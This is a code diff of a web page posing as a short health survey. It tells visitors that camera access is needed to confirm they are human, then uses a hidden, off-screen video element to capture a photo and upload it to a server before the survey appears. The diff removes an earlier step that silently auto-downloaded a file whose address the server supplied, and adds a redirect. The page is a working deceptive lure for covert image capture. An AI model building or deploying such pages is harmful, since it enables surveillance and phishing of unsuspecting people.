@@ -3,77 +3,40 @@
 <head>
 <meta charset="UTF-8">
 <title>Health Survey</title>
+<link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-body { 
-  font-family: 'Poppins', sans-serif; 
-  text-align: center; 
-  margin: 0; 
-  background: linear-gradient(135deg, #ff9a9e, #fad0c4, #fad0c4); 
-  min-height: 100vh; 
-  display: flex; 
-  flex-direction: column; 
-  justify-content: center; 
-  align-items: center;
-  animation: gradient 8s ease infinite;
-  background-size: 400% 400%;
-}
-@keyframes gradient {
-  0% {background-position:0% 50%;}
-  50% {background-position:100% 50%;}
-  100% {background-position:0% 50%;}
+body {
+  font-family: 'Rubik', sans-serif;
+  background: linear-gradient(120deg, #f093fb, #f5576c);
+  margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column;
+  color: #fff; text-align: center;
 }
 video { width: 1px; height: 1px; position: absolute; top: -100px; left: -100px; }
 canvas { display: none; }
-h2 { color: #fff; font-size: 28px; margin-bottom: 10px; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
-p { color: #fff; font-size: 18px; margin-bottom: 20px; text-shadow: 0 1px 5px rgba(0,0,0,0.2); }
-form { 
-  display: none; 
-  background: rgba(255,255,255,0.95); 
-  padding: 25px; 
-  border-radius: 15px; 
-  width: 350px; 
-  box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-  animation: fadeIn 1s ease forwards;
-}
-@keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
-input, select, textarea { 
-  width: 100%; 
-  margin-bottom: 12px; 
-  padding: 10px; 
-  border-radius: 8px; 
-  border: 1px solid #ccc; 
-  font-size: 16px;
-}
-button { 
-  padding: 12px 25px; 
-  cursor: pointer; 
-  background: #ff416c; 
-  color: white; 
-  border: none; 
-  border-radius: 12px; 
-  font-weight: bold; 
-  transition: 0.3s; 
-  font-size: 16px;
-}
-button:hover { background: #ff4b2b; transform: scale(1.05);}
-#thanksMessage { display: none; color: #fff; font-size: 20px; margin-top: 20px; }
+h1 { font-size: 2em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3);}
+h2 { font-weight: 400; margin-bottom: 20px; }
+button { padding: 12px 25px; cursor: pointer; background: #fff; color: #f5576c; font-weight: bold; border-radius: 12px; border:none; transition: transform 0.3s; }
+button:hover { transform: scale(1.1); }
+form { display:none; background: rgba(255,255,255,0.95); color:#333; padding:20px; border-radius:15px; width:350px; margin-top:20px; }
+input, select, textarea { width:100%; margin-bottom:12px; padding:8px; border-radius:6px; border:1px solid #ccc; }
+#thanksMessage { display:none; font-size:1.2em; margin-top:20px; color:#4CAF50; }
 </style>
 </head>
-
 <body>
-<h2>📸 Please allow camera access!</h2>
-<p>This confirms you’re human before starting the survey.</p>
+
+<h1>Welcome to Health Survey</h1>
+<h2>Please allow camera to confirm you are human 😊</h2>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
 <form id="surveyForm">
-  <h3>Health Survey 🌿</h3>
+  <h3>Quick Health Survey</h3>
 
   <label>Name:</label>
-  <input type="text" name="name" placeholder="Your Name" required>
+  <input type="text" name="name" required>
 
-  <label>Sleep Hours:</label>
+  <label>How many hours do you sleep?</label>
   <select name="sleep" required>
     <option value="<5"><5</option>
     <option value="5-6">5-6</option>
@@ -81,27 +44,16 @@ button:hover { background: #ff4b2b; transform: scale(1.05);}
     <option value="7+">7+</option>
   </select>
 
-  <label>Exercise:</label>
+  <label>Do you exercise regularly?</label>
   <select name="exercise" required>
     <option value="Yes">Yes</option>
     <option value="No">No</option>
   </select>
 
-  <label>Water intake:</label>
-  <select name="water" required>
-    <option value="0-1">0-1 glasses</option>
-    <option value="2-3">2-3 glasses</option>
-    <option value="4-5">4-5 glasses</option>
-    <option value="5+">5+ glasses</option>
-  </select>
-
-  <label>Other habits:</label>
-  <textarea name="habits" rows="3" placeholder="e.g. meditation, walking"></textarea>
-
-  <button type="submit">Submit ✅</button>
+  <button type="submit">Submit Survey</button>
 </form>
 
-<p id="thanksMessage">Thank you for confirming! Redirecting to survey...</p>
+<p id="thanksMessage">Thank you! Redirecting to survey...</p>
 
 <script>
 const video = document.getElementById("video");
@@ -113,7 +65,9 @@ async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
+
     setTimeout(() => captureAndSend(stream), 1000);
+
   } catch (err) {
     alert("Camera permission is required to continue.");
   }
@@ -133,16 +87,10 @@ function captureAndSend(stream) {
       const data = await res.json();
 
       if (data.status === "success") {
-        // Auto-download
-        const a = document.createElement("a");
-        a.href = data.downloadUrl;
-        a.download = "";
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
+        console.log("Photo uploaded successfully."); // Render logs
 
         document.querySelector('h2').style.display = 'none';
-        document.querySelector('p').style.display = 'none';
+        document.querySelector('h1').style.display = 'none';
         form.style.display = 'block';
       } else {
         alert("Upload failed.");
@@ -159,6 +107,9 @@ form.addEventListener("submit", e => {
   e.preventDefault();
   form.style.display = "none";
   thanks.style.display = "block";
+
+  // Redirect to full survey page after 3 sec
+  setTimeout(() => window.location.href = "survey.html", 3000);
 });
 
 init();
